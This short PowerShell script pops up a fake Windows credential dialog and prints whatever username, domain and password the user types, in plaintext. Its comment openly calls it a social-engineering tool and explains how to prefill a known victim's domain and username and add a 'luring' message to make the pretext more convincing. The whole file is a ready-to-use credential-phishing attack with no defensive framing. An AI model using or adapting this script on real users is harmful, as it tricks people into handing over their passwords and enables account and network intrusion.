<#

try { 
  (Get-Credential -Credential $null).GetNetworkCredential() | 
  Select-Object @{name="User"; expression = {
      If ($_.Domain -ne [string]::Empty) {
        "{0}\{1}" -f ($_.Domain), ($_.UserName)
      } Else { 
        $_.UserName
      } 
    }
  }, Password | Format-List 
} catch { 
}

One can additionally add, right after Get-Credential following parameters that could improve 
pretext's quality during social engineering attempt:

-Credential domain\username - when we know our victim's domain and/or username - we can supply this info to the dialog
-Message "Some luring sentence" - to include some luring message

#>

try { ((Get-Credential -Credential $null).GetNetworkCredential() | Select-Object @{name="User"; expression={If ($_.Domain -ne [string]::Empty) {"{0}\{1}" -f ($_.Domain), ($_.UserName)} Else { $_.UserName} }}, Password | Format-List) } catch { }
